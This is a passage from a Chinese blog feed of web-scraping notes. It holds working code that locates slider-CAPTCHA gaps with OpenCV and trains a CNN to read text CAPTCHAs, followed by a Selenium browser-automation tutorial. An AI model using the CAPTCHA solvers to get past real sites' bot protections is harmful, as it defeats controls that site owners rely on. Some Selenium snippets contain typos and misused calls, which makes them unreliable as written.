class="number">0.15</span>) * (image_height * <span class="number">0.25</span>) * <span class="number">0.8</span></span><br><span class="line">    contour_area_max = (image_width * <span class="number">0.15</span>) * (image_height * <span class="number">0.25</span>) * <span class="number">1.2</span></span><br><span class="line">    <span class="keyword">return</span> contour_area_min, contour_area_max</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_arc_length_threshold</span>(<span class="params">image_width, image_height</span>):</span></span><br><span class="line">    arc_length_min = ((image_width * <span class="number">0.15</span>) + (image_height * <span class="number">0.25</span>)) * <span class="number">2</span> * <span class="number">0.8</span></span><br><span class="line">    arc_length_max = ((image_width * <span class="number">0.15</span>) + (image_height * <span class="number">0.25</span>)) * <span class="number">2</span> * <span class="number">1.2</span></span><br><span class="line">    <span class="keyword">return</span> arc_length_min, arc_length_max</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_offset_threshold</span>(<span class="params">image_width</span>):</span></span><br><span class="line">    offset_min = <span class="number">0.2</span> * image_width</span><br><span class="line">    offset_max = <span class="number">0.85</span> * image_width</span><br><span class="line">    <span class="keyword">return</span> offset_min, offset_max</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    image_raw = cv2.imread(<span class="string">&#x27;captcha.png&#x27;</span>)</span><br><span class="line">    image_height, image_width, _ = image_raw.shape</span><br><span class="line">    image_gaussian_blur = get_gaussian_blur_image(image_raw)</span><br><span class="line">    image_canny = get_canny_image(image_gaussian_blur)</span><br><span class="line">    contours = get_contours(image_canny)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;image_canny.png&#x27;</span>, image_canny)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;image_gaussian_blur.png&#x27;</span>, image_gaussian_blur)</span><br><span class="line">    contour_area_min, contour_area_max = get_contour_area_threshold(image_width, image_height)</span><br><span class="line">    arc_length_min, arc_length_max = get_arc_length_threshold(image_width, image_height)</span><br><span class="line">    offset_min, offset_max = get_offset_threshold(image_width)</span><br><span class="line">    offset = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> contour <span class="keyword">in</span> contours:</span><br><span class="line">        x, y, w, h = cv2.boundingRect(contour)  <span class="comment"># x 和 y 是矩形左上角坐标，w 和 h 是矩形宽高</span></span><br><span class="line">        <span class="keyword">if</span> contour_area_min &lt; cv2.contourArea(contour) &lt; contour_area_max <span class="keyword">and</span> \</span><br><span class="line">                arc_length_min &lt; cv2.arcLength(contour, <span class="literal">True</span>) &lt; arc_length_max <span class="keyword">and</span> \</span><br><span class="line">                offset_min &lt; x &lt; offset_max:</span><br><span class="line">            cv2.rectangle(image_raw, (x, y), (x + w, y + h), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>), <span class="number">2</span>)  <span class="comment"># 图片，左上角坐标，右下角坐标，颜色，框线宽度</span></span><br><span class="line">            offset = x</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;image_label.png&#x27;</span>, image_raw)</span><br><span class="line">    print(<span class="string">&#x27;offset&#x27;</span>, offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">offset <span class="number">163</span></span><br></pre></td></tr></table></figure><p>成功提取出目标缺口位置：</p><p><img data-src="https://s2.loli.net/2022/03/01/3EtMcLjshkxaCm7.png"></p><h3 id="利用深度学习识别图形验证码"><a href="#利用深度学习识别图形验证码" class="headerlink" title="利用深度学习识别图形验证码"></a>利用深度学习识别图形验证码</h3><p>前两节了解的技术有个共同的缺点，就是正确率不高，下面进行深度学习识别验证码的技术。</p><p><strong>数据准备</strong></p><p>要训练一个深度学习模型，我们需要训练数据，分为图片数据和标注数据，模型在训练不断调优的过程，就是逐渐学会怎么识别一张张验证码图片的过程。</p><p>数据标注是一个枯燥漫长的工作，相当一部分需要人工标注，我们可以反其道而行，先随机生成标注数据，再由此生成验证码图片：</p><p><code>generate.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> captcha.image <span class="keyword">import</span> ImageCaptcha</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> setting</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_captcha_text</span>():</span></span><br><span class="line">    captcha_text = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(setting.MAX_CAPTCHA):</span><br><span class="line">        c = random.choice(setting.ALL_CHAR_SET)</span><br><span class="line">        captcha_text.append(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(captcha_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_captcha_text_and_image</span>():</span></span><br><span class="line">    image = ImageCaptcha()</span><br><span class="line">    captcha_text = generate_captcha_text()</span><br><span class="line">    captcha_image = Image.<span class="built_in">open</span>(image.generate(captcha_text))</span><br><span class="line">    <span class="keyword">return</span> captcha_text, captcha_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">3000</span></span><br><span class="line">    path = setting.EVAL_DATASET_PATH</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        now = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">        text, image = generate_captcha_text_and_image()</span><br><span class="line">        filename = text + <span class="string">&#x27;_&#x27;</span> + now + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">        image.save(path + os.path.sep + filename)</span><br><span class="line">        print(<span class="string">&#x27;saved %d : %s &#x27;</span> % (i + <span class="number">1</span>, filename))</span><br></pre></td></tr></table></figure><p><code>settting.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证码中的字符</span></span><br><span class="line"><span class="comment"># string.digits + string.ascii_uppercase</span></span><br><span class="line">NUMBER = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line">ALPHABET = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ALL_CHAR_SET = NUMBER + ALPHABET</span><br><span class="line">ALL_CHAR_SET_LEN = <span class="built_in">len</span>(ALL_CHAR_SET)</span><br><span class="line">MAX_CAPTCHA = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像大小</span></span><br><span class="line">IMAGE_HEIGHT = <span class="number">60</span></span><br><span class="line">IMAGE_WIDTH = <span class="number">160</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练集、验证集、推理集的路径，os.path.sep 是为了兼容不同系统</span></span><br><span class="line">TRAIN_DATASET_PATH = <span class="string">&#x27;dataset&#x27;</span> + os.path.sep + <span class="string">&#x27;train&#x27;</span></span><br><span class="line">EVAL_DATASET_PATH = <span class="string">&#x27;dataset&#x27;</span> + os.path.sep + <span class="string">&#x27;eval&#x27;</span></span><br><span class="line">PREDICT_DATASET_PATH = <span class="string">&#x27;dataset&#x27;</span> + os.path.sep + <span class="string">&#x27;predict&#x27;</span></span><br></pre></td></tr></table></figure><p>在 <code>generate.py</code> 中修改 <code>count</code>和<code>path</code>的值并运行，生成训练集(100000)和验证集(3000)数据。</p><p><strong>模型训练</strong></p><p>这里使用的深度学习模型是 CNN 模型：</p><p><code>model.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> setting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CNN Model (2 conv layer)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNN</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CNN, self).__init__()</span><br><span class="line">        self.layer1 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>, <span class="number">32</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">32</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.5</span>),  <span class="comment"># drop 50% of the neuron</span></span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>))</span><br><span class="line">        self.layer2 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.5</span>),  <span class="comment"># drop 50% of the neuron</span></span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>))</span><br><span class="line">        self.layer3 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.5</span>),  <span class="comment"># drop 50% of the neuron</span></span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>))</span><br><span class="line">        self.fc = nn.Sequential(</span><br><span class="line">            nn.Linear((setting.IMAGE_WIDTH // <span class="number">8</span>) * (setting.IMAGE_HEIGHT // <span class="number">8</span>) * <span class="number">64</span>, <span class="number">1024</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.5</span>),  <span class="comment"># drop 50% of the neuron</span></span><br><span class="line">            nn.ReLU())</span><br><span class="line">        self.rfc = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">1024</span>, setting.MAX_CAPTCHA * setting.ALL_CHAR_SET_LEN),</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        out = self.layer1(x)</span><br><span class="line">        out = self.layer2(out)</span><br><span class="line">        out = self.layer3(out)</span><br><span class="line">        out = out.view(out.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        out = self.fc(out)</span><br><span class="line">        out = self.rfc(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><p>可以看到这里定义了三层，每层都是 Conv2d(卷积)、BatchNorm2d(批标准化)、Dropout(随机失活)、ReLU(激活函数)和 MaxPool2d(池化)的组合，经过这三层处理后， 由一个全连接网络层输出最终结果，用于计算模型的最终损失。</p><p>训练过程定义在 <code>train.py</code>中，训练逻辑为：</p><ul><li>引入定义好的模型，即 <code>model.py</code>文件，对模型进行初始化；</li><li>定义损失函数 loss；</li><li>定义优化器 optimizer；</li><li>加载数据，一般包括训练集数据和验证集数据；</li><li>执行训练，过程包括反向求导、模型权重更新；</li><li>在执行完特定的训练步数后，验证和保存模型</li></ul><p>训练过程输出结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">epoch: <span class="number">0</span> step: <span class="number">9</span> loss: <span class="number">0.23277591168880463</span></span><br><span class="line">epoch: <span class="number">0</span> step: <span class="number">19</span> loss: <span class="number">0.14827308058738708</span></span><br><span class="line">...</span><br><span class="line">epoch: <span class="number">0</span> step: <span class="number">1579</span> loss: <span class="number">0.07314150780439377</span></span><br><span class="line">epoch: <span class="number">0</span> step: <span class="number">1589</span> loss: <span class="number">0.0810374841094017</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到训练过程中模型的损失在不断降低，说明模型在不断地学习和优化，同时每训练完一个轮次后会执行一次模型验证。经过一段时间训练后，模型损失趋近于 0，验证的正确率能达到 96% 以上，本地有生成一个 <code>base_model.pkl</code>文件，即我们要的模型。</p><p><strong>测试</strong></p><p>现在 PREDICT_DATAEST_PATH 对应路径下生成几个验证码图片，先加载模型文件，代码为<code>cnn.load_state_dict(torch.load(&#39;best_model.pkl&#39;))</code>，并根据加载的模型对定义的 CNN 模型的权重进行初始化，运行后可看到输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIQG</span><br><span class="line">IW6S</span><br></pre></td></tr></table></figure><p>识别成功！如此就得到了一个识别图形验证码的深度学习模型，基于本节内容可以进一步优化：</p><ul><li>由于本节各环节都是用了 captcha 库生成的，验证码风格也是事先设定的，所以模型识别正确率较高，如果输入其他类型的验证码，例如文本类型，文本数量、干扰线样式和本节的不同，识别的正确率就不会理想。为了让模型能识别更多验证码，可以多生成一些不同风格的验证码来训练模型；</li><li>当前模型的预测过程是通过命令执行的，实际可以考虑对接 API 服务器，例如对接 Flask、Django、FastAPI 等，把预测过程实现为一个支持 POST 请求的 API，接收验证码图片并返回文本信息，这样会更方便易用。</li></ul><p><a href="https://github.com/Python3WebSpider/DeepLearningImageCaptcha">完整代码</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;本章学习验证码的识别，不同验证码的识别方式和思路有所不同，有的用图像处理库即可，有的则需要借助深度学习技术，还有的需要借助一些工具和平台完成，学完后要进行举一反三，灵活应对不同场景。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记七 -- JavaScript 动态渲染页面爬取</title>
    <link href="https://speedpromise.github.io/archives/d1c41f0f.html"/>
    <id>https://speedpromise.github.io/archives/d1c41f0f.html</id>
    <published>2022-02-24T12:25:08.000Z</published>
    <updated>2022-03-01T15:21:57.476Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png" style="zoom: 67%;" /><p>有些场景，比如 Ajax 接口中有加密参数或是像 ECharts 这种经过 Js 计算生成的页面，很难去爬取和分析规律，本章我们来了解一种技术，归纳为“所见即所爬”，我们可以直接模拟浏览器运行，然后爬取数据。</p><span id="more"></span><h3 id="Selenium-的使用"><a href="#Selenium-的使用" class="headerlink" title="Selenium 的使用"></a>Selenium 的使用</h3><p>现在很多网站的 Ajax 请求的接口都含有加密参数，例如 token、sign 等，<a href="https://spa2.scrape.center/">示例网址</a>的 Ajax 接口就含有一个 token 参数，如下图：</p><p><img data-src="https://s2.loli.net/2022/02/24/dkVPhOTw6xyJ8RN.png"></p><p>如果不深入分析找到 token 的构造逻辑是难以直接模拟 Ajax 请求的，除此之外，也可以使用模拟浏览器运行的方式来爬取数据，我们先来了解一下 Selenium 自动化测试工具的基本用法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()  <span class="comment"># 初始化浏览器对象</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">&#x27;https://baidu.com&#x27;</span>)  <span class="comment"># 访问页面</span></span><br><span class="line">    <span class="comment"># 查找单个节点，复数为查找多个，查找方式有 ID、NAME、XPATH、TAG_NAME、CLASS_NAME、CSS_SELECTOR 等</span></span><br><span class="line">    <span class="built_in">input</span> = browser.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>)  </span><br><span class="line">    <span class="comment"># send_keys() 输入文字、clear() 清空文字、click() 点击按钮</span></span><br><span class="line">    <span class="built_in">input</span>.send_keys(<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>.send_keys(Keys.ENTER)</span><br><span class="line">    wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;content-left&#x27;</span>)))</span><br><span class="line">    print(browser.current_url)</span><br><span class="line">    print(browser.get_cookies())</span><br><span class="line">    print(browser.page_source)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.c()</span><br></pre></td></tr></table></figure><p>要实现鼠标拖拽、键盘按键等，需要使用<strong>动作链</strong>，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)  <span class="comment"># 切换到子 frame，在父 frame 也是无法获取子 frame 信息的</span></span><br><span class="line">source = browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;#draggable&#x27;</span>)</span><br><span class="line">target = browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;#droppable&#x27;</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line">actions.drag_and_drop(source, target)</span><br><span class="line">actions.perform()</span><br></pre></td></tr></table></figure><p>Selenium 支持模拟运行 JavaScript，帮助实现比如下拉进度条等操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.scrollTo(0, document.body.scrollHeight)&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;alert(&quot;To Bottom&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Selenium 提供了选择节点的方法，也提供了相关的方法和属性来直接提取节点属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">node = browser.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>)</span><br><span class="line">attr = node.get_attritube(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">text = node.text</span><br><span class="line">id_ = node.<span class="built_in">id</span></span><br><span class="line">location = node.location  <span class="comment"># 节点在页面中的相对位置</span></span><br><span class="line">tag_name = node.tag_name  <span class="comment"># 标签名称</span></span><br><span class="line">size = node.size  <span class="comment"># 节点大小，即宽高</span></span><br></pre></td></tr></table></figure><p>延迟等待</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 隐式等待，固定等待时间</span></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = implicitly_wait(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显式等待，指定最长等待时间</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 调用 wait.until() 传入等待条件</span></span><br><span class="line">input_ = wait.until(EC.presence_of_element_located((By.ID, <span class="string">&#x27;q&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>更多等待条件可以参考<a href="https://selenium-python.readthedocs.io/api.html?highlight=expected_con#module-selenium.webdriver.support.expected_conditions">官方文档</a>。</p><p>前进和后退</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.back()</span><br><span class="line">browser.forward()</span><br></pre></td></tr></table></figure><p>Selenium 也可以对 Cookie 进行操作，例如获取、添加、删除等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;www.zhihu.com&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;geermey&#x27;</span>&#125;)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line">print(browser.get_cookies())</span><br></pre></td></tr></table></figure><p>选项卡管理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.open()&#x27;</span>)</span><br><span class="line">print(browser.window_handles)</span><br><span class="line">browser.switch_to.window(browser.window_handles[<span class="number">1</span>])</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.taobao.com/&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">browser.switch_to.window(browser.window_handles[<span class="number">0</span>])</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br></pre></td></tr></table></figure><p>异常处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException, NoSuchElementException</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span 